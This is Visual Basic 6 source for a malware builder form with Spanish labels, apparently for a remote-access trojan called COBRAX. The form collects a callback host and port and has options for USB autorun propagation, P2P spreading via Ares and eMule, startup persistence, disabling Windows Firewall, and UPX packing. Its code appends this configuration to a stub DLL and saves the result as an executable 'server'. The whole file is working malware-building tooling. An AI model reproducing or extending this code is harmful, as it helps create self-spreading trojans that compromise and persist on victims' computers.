VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{DA729E34-689F-49EA-A856-B57046630B73}#1.0#0"; "Bar.ocx"
Begin VB.Form Form3 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server configuración"
   ClientHeight    =   2880
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   5550
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2880
   ScaleWidth      =   5550
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.OptionButton normal 
      Caption         =   "&Normal"
      Height          =   255
      Left            =   4320
      TabIndex        =   11
      Top             =   1080
      Width           =   1095
   End
   Begin VB.OptionButton upx 
      Caption         =   "&UPX"
      Height          =   255
      Left            =   4320
      TabIndex        =   10
      Top             =   720
      Value           =   -1  'True
      Width           =   1095
   End
   Begin Proyecto2.XP_ProgressBar ProgressBar1 
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   2400
      Width           =   5295
      _ExtentX        =   9340
      _ExtentY        =   661
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BrushStyle      =   0
      Color           =   16750899
   End
   Begin VB.TextBox port 
      Height          =   285
      Left            =   4800
      TabIndex        =   8
      Text            =   "100"
      Top             =   240
      Width           =   615
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   4440
      OleObjectBlob   =   "Form3.frx":5C12
      Top             =   600
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cerrar"
      Height          =   375
      Left            =   2880
      TabIndex        =   7
      Top             =   1800
      Width           =   1215
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   4920
      Top             =   600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CheckBox windows 
      Caption         =   "&Iniciar al encender Windows"
      Height          =   375
      Left            =   120
      TabIndex        =   6
      Top             =   1800
      Width           =   2655
   End
   Begin VB.CheckBox firewall 
      Caption         =   "&Matar Firewall de Windows y otras caracteristicás"
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   1440
      Width           =   4215
   End
   Begin VB.CheckBox p2p 
      Caption         =   "&Propagacion P2P  ( Ares, Emule. )"
      Height          =   375
      Left            =   120
      TabIndex        =   4
      Top             =   1080
      Width           =   3735
   End
   Begin VB.CheckBox usb 
      Caption         =   "&Propagacion USB"
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   720
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Crear!"
      Height          =   375
      Left            =   4200
      TabIndex        =   2
      Top             =   1800
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1320
      TabIndex        =   1
      Top             =   240
      Width           =   3375
   End
   Begin VB.Label Label1 
      Caption         =   "IP/Host/DNS"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   1095
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ff As Long
Dim Firma As String
Dim stubdata As String
Dim buffer As String
Dim aniCursor1 As clsAniCursor

Private Sub Check1_Click()
If Check1.Value = 1 Then
    MsgBox "Tenga en cúenta que úsar esta propagacion, si bien se autocopiara a cada medio extraible, el Autorun.inf puede no funcionar en todos los sistemas", vbInformation + vbOKOnly, "Aviso"
End If
End Sub

Private Sub Command1_Click()

If Not Text1 = "" Then
     CommonDialog1.DialogTitle = "Seleccione donde desea guardar el archivo"
     CommonDialog1.Filter = "Archivos ejecutables (*.exe)|*.exe"
     CommonDialog1.FilterIndex = 0
     CommonDialog1.ShowSave
Else
     MsgBox "Servidor no especificado.", , "Error"
End If

If Not IsNumeric(port.Text) Then
MsgBox "Por favor ingrese un valor numerico en la casilla de puerto", vbCritical + vbOKOnly, "Error"
port.Text = 100
port.SetFocus
End If

If Not CommonDialog1.FileName = "" And IsNumeric(port.Text) Then

    ff = FreeFile
    ProgressBar1.Value = Val(ProgressBar1.Value) + 10
    
    If upx.Value = True Then
        Normal.Value = False
        Open App.path & "\COBRAX.DLL" For Binary As ff
    End If
    
    If Normal.Value = True Then
        upx.Value = False
        Open App.path & "\COBRAXDEFAULT.DLL" For Binary As ff
    End If
    
    stubdata = Space(LOF(ff))
    ProgressBar1.Value = Val(ProgressBar1.Value) + 20
    Get ff, , stubdata
    Close ff
    
    Open CommonDialog1.FileName For Binary As ff
    ProgressBar1.Value = Val(ProgressBar1.Value) + 30
    
    If Text1.Text = "localhost" Then
        Text1.Text = "127.0.0.1"
    End If 'Configuramos por si quiere hacer testeo
    
    buffer = "++**" & Text1.Text & "," & usb.Value & "," & p2p.Value & "," & windows.Value & "," & firewall.Value & Val(port.Text) & ","
    Put ff, , stubdata & buffer
    Close ff
    
    ProgressBar1.Value = Val(ProgressBar1.Value) + 40
    MsgBox "Exito al generar el servidor", vbInformation + vbOKOnly, "Exito"
    
    stubdata = ""
    buffer = ""
    CommonDialog1.FileName = ""
    'Limpiamos las variables para volver a crear el servidor si es necesario por prueba de fallos.
    
    Unload Me
End If
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Activate()
Skin1.LoadSkin App.path & "\sk\skin5.skn"
Skin1.ApplySkin Form3.hwnd
End Sub
